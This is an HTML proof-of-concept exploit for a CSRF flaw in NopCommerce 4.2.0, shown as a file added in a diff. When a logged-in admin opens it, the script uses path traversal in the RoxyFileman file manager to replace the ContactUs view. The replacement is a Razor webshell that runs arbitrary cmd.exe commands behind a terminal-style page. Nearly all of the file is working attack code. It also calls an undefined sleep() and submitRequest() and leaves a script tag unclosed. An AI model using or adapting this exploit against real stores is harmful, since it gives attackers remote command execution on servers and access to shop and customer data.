@@ -1,0 +1,244 @@
+<html>
+<!-- 
+# Vulnerability Title: NopCommerce 4.2.0 - WebShell Upload CSRF (PoC)
+# Author: Alessandro Magnosi (d3adc0de)
+# Date: (DD/MM/YYYY) - 07/07/2019
+# Vendor Homepage: https://www.nopcommerce.com/
+# Software Link : https://www.nopcommerce.com/
+# Tested Version: 4.2.0
+# Vulnerability Type: Privilege Escalation
+# Tested on OS: Windows 10, CentOS, Docker
+# Exploit designed for: NopCommerce 4.2.0 on IIS
+-->
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <script>
+function deleteContactUs(baseurl)
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", baseurl + "\/Admin\/RoxyFileman\/ProcessRequest?a=DELETEFILE&f=%2Fimages%2Fuploaded%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fapp%2fViews%2FCommon%2fContactUs.cshtml", true);
+        xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,*\/*;q=0.8");
+        xhr.setRequestHeader("Accept-Language", "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3");
+        xhr.withCredentials = true;
+        var body = "";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+      }
+
+function renameCommonDir(baseurl)
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", baseurl + "\/Admin\/RoxyFileman\/ProcessRequest?a=RENAMEDIR&d=%2fimages%2fuploaded%2f..%2F..%2F..%2F..%2F..%2F..%2F..%2Finetpub%2fwwwroot%2fnopcommerce%2fViews%2fCommon%2f&n=Common2", true);
+        xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,*\/*;q=0.8");
+        xhr.setRequestHeader("Accept-Language", "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3");
+        xhr.withCredentials = true;
+        var body = "";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+      }
+
+function recreateCommonDir(baseurl)
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", baseurl + "\/Admin\/RoxyFileman\/ProcessRequest?a=CREATEDIR&d=%2fimages%2fuploaded%2f..%2F..%2F..%2F..%2F..%2F..%2F..%2Finetpub%2fwwwroot%2fnopcommerce%2fViews%2f&n=Common", true);
+        xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,*\/*;q=0.8");
+        xhr.setRequestHeader("Accept-Language", "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3");
+        xhr.withCredentials = true;
+        var body = "";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+      }
+
+function uploadShell(baseurl)
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", baseurl + "\/Admin\/RoxyFileman\/ProcessRequest?a=UPLOAD", true);
+        xhr.setRequestHeader("Accept", "*\/*");
+        xhr.setRequestHeader("Accept-Language", "en-GB,en;q=0.5");
+        xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=---------------------------3125261928760");
+        xhr.withCredentials = true;
+        var body = "-----------------------------3125261928760\r\n" + 
+          "Content-Disposition: form-data; name=\"action\"\r\n" + 
+          "\r\n" + 
+          "upload\r\n" + 
+          "-----------------------------3125261928760\r\n" + 
+          "Content-Disposition: form-data; name=\"method\"\r\n" + 
+          "\r\n" + 
+          "ajax\r\n" + 
+          "-----------------------------3125261928760\r\n" + 
+          "Content-Disposition: form-data; name=\"d\"\r\n" + 
+          "\r\n" + 
+          "/images/uploaded/../../../../../../../../../../inetpub/wwwroot/nopcommerce/Views/Common/\r\n" + 
+          "-----------------------------3125261928760\r\n" + 
+          "Content-Disposition: form-data; name=\"files[]\"; filename=\"2fContactUs.cshtml\"\r\n" + 
+          "Content-Type: image/png\r\n" + 
+          "\r\n" + 
+          "@using System\r\n" + 
+          "@using System.Diagnostics\r\n" + 
+          "\r\n" + 
+          "@{ \r\n" + 
+          "    ViewData[\"Title\"] = \"MVC Sh3ll Windows\";\r\n" + 
+          "    var result = \"\";\r\n" + 
+          "    var cmd = Context.Request.Query[\"cmd\"];\r\n" + 
+          "    if (!String.IsNullOrEmpty(cmd)){\r\n" + 
+          "        result = Bash(cmd);\r\n" + 
+          "    }\r\n" + 
+          "\r\n" + 
+          "    if (String.IsNullOrEmpty(result)){\r\n" + 
+          "        result = \"Invalid command or something didn\'t work\";\r\n" + 
+          "    }\r\n" + 
+          "\r\n" + 
+          "}\r\n" + 
+          "\r\n" + 
+          "@functions{\r\n" + 
+          "    public static string Bash (string cmd)\r\n" + 
+          "    {\r\n" + 
+          "        var result = \"\";\r\n" + 
+          "        var escapedArgs = cmd.Replace(\"\\\"\", \"\\\\\\\"\");\r\n" + 
+          "        var process = new Process()\r\n" + 
+          "        {\r\n" + 
+          "            StartInfo = new ProcessStartInfo\r\n" + 
+          "            {\r\n" + 
+          "                FileName = \"cmd.exe\",\r\n" + 
+          "                Arguments = $\"/C \\\"{escapedArgs}\\\"\",\r\n" + 
+          "                RedirectStandardOutput = true,\r\n" + 
+          "                UseShellExecute = false,\r\n" + 
+          "                CreateNoWindow = true,\r\n" + 
+          "            }\r\n" + 
+          "        };\r\n" + 
+          "\r\n" + 
+          "        process.Start();\r\n" + 
+          "        result = process.StandardOutput.ReadToEnd();\r\n" + 
+          "        process.WaitForExit();\r\n" + 
+          "\r\n" + 
+          "        return result;\r\n" + 
+          "    }\r\n" + 
+          "}\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "\x3cscript\r\n" + 
+          "  src=\"https://code.jquery.com/jquery-3.2.1.min.js\"\r\n" + 
+          "  integrity=\"sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=\"\r\n" + 
+          "  crossorigin=\"anonymous\"\x3e\x3c/script\x3e\r\n" + 
+          "\x3cscript\x3e\r\n" + 
+          "$(function() {\r\n" + 
+          "    var cmdResult = $(\"#cmdResult\");\r\n" + 
+          "\r\n" + 
+          "\tconsole.log(cmdResult);\r\n" + 
+          "\r\n" + 
+          "\tif (cmdResult.text() === \"Invalid command or something didn\'t work\"){\r\n" + 
+          "\t    console.log(\"should change text\");\r\n" + 
+          "        cmdResult.css(\"color\", \"red\");\r\n" + 
+          "\t}\r\n" + 
+          "\t\r\n" + 
+          "\tvar term = $(\"#console\");\r\n" + 
+          "    $(\"#cmd\").focus();\r\n" + 
+          "\tterm.scrollTop(term.prop(\"scrollHeight\"));\r\n" + 
+          "\t\r\n" + 
+          "\t$.urlParam = function(name){\r\n" + 
+          "        var results = new RegExp(\'[\\?&]\' + name + \'=([^&#]*)\').exec(window.location.href);\r\n" + 
+          "        if (results==null){\r\n" + 
+          "           return null;\r\n" + 
+          "        }\r\n" + 
+          "        else{\r\n" + 
+          "           return decodeURI(results[1]) || 0;\r\n" + 
+          "        }\r\n" + 
+          "    }\r\n" + 
+          "\r\n" + 
+          "\t\r\n" + 
+          "\tfunction executeCmd(){\r\n" + 
+          "        var cmd = encodeURIComponent($(\"#cmd\").val());\r\n" + 
+          "\t    var currentCmd = $.urlParam(\'cmd\');\r\n" + 
+          "\t    console.log(\"should replace: \" + currentCmd + \" WITH: \" + cmd);\r\n" + 
+          "\r\n" + 
+          "\t    var currentUrl = location.href;\r\n" + 
+          "\r\n" + 
+          "\t    var paramDelimeter = \"\";\r\n" + 
+          "\t    if (currentUrl.indexOf(\"?\") \x3c 0){\r\n" + 
+          "\t        paramDelimeter = \"?\";\r\n" + 
+          "\t    } else {\r\n" + 
+          "\t        paramDelimeter = \"&\";\r\n" + 
+          "\t    }\r\n" + 
+          "        \r\n" + 
+          "\t    if (currentUrl.indexOf(\"cmd=\") \x3c 0){\r\n" + 
+          "            currentUrl = location.href + paramDelimeter + \"cmd=\";\r\n" + 
+          "\t    }\r\n" + 
+          "\t\r\n" + 
+          "        var newUrl = currentUrl.replace(/cmd=.*/, \"cmd=\"+cmd);\r\n" + 
+          "        window.location.href = newUrl;\r\n" + 
+          "\r\n" + 
+          "\t    //console.log(newUrl);\r\n" + 
+          "\t}\r\n" + 
+          "\t\r\n" + 
+          "    $(\"#submitCommand\").click(function(){\r\n" + 
+          "\t    executeCmd();\r\n" + 
+          "\t})\r\n" + 
+          "\r\n" + 
+          "\t$(\"#cmd\").keypress(function (e) {\r\n" + 
+          "\t    if (e.which == 13) {\r\n" + 
+          "\t        executeCmd();\r\n" + 
+          "\t        return false;\r\n" + 
+          "\t    }\r\n" + 
+          "\t});\r\n" + 
+          "\r\n" + 
+          "\t$(\"#cmd\").on(\"change paste keyup\", function(theVal){\r\n" + 
+          "\t    var cmd = $(\"#cmd\").val();\r\n" + 
+          "\t    $(\"#cmdInput\").text(cmd);\r\n" + 
+          "\t});\r\n" + 
+          "});\r\n" + 
+          "\r\n" + 
+          "\x3c/script\x3e\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "\x3ch3\x3e@ViewData[\"Title\"].\x3c/h3\x3e\r\n" + 
+          "\x3ch4\x3e@ViewData[\"Message\"]\x3c/h4\x3e\r\n" + 
+          "\x3ch4\x3eOutput for:\x3e \x3cspan style=\"font-family: monospace; font-weight: normal;\"\x3e@cmd\x3c/span\x3e\x3c/h4\x3e\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "\x3cpre id=\"console\" style=\"color: #00ff00;background-color: #141414;max-height: 606px;\"\x3e\r\n" + 
+          "C#:\x3e@cmd\r\n" + 
+          "\t\r\n" + 
+          "\x3cspan id=\"cmdResult\"\x3e@result\x3c/span\x3e\r\n" + 
+          "\t\r\n" + 
+          "C#:\x3e\x3cspan id=\"cmdInput\"\x3e\x3c/span\x3e\r\n" + 
+          "\x3c/pre\x3e\r\n" + 
+          "\r\n" + 
+          "\x3cbr /\x3e\r\n" + 
+          "\r\n" + 
+          "\x3cp\x3eEnter your command below:\x3c/p\x3e\r\n" + 
+          "\x3cspan style=\"display: inline-flex !important;\"\x3e\r\n" + 
+          "    \x3cinput  id=\"cmd\" class=\"form-control\" type=\"text\" style=\"width: 400px;\" /\x3e \r\n" + 
+          "\t\x3cbutton id=\"submitCommand\" class=\"btn btn-primary\"\x3eSend!\x3c/button\x3e\r\n" + 
+          "\x3c/span\x3e\r\n" + 
+          "\r\n" + 
+          "-----------------------------3125261928760--";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+      }
+	  
+	  var baseurl = "http://127.0.0.1";
+	  /*
+		Deleting or renaming the file contacus.cshtml has been found to have a lower success rate than the rename dir technique
+		While an explanation is still matter of research, it was chosen to go for the latter
+
+		//deleteContactUs(baseurl); 
+	  */
+	  renameCommonDir(baseurl);
+	  sleep(1000);
+	  recreateCommonDir(baseurl);
+	  sleep(1000);
+	  uploadShell(baseurl);
+    <form action="#">
+      <input type="button" value="Submit request" onclick="submitRequest();" />
+    </form>
+  </body>
+</html>
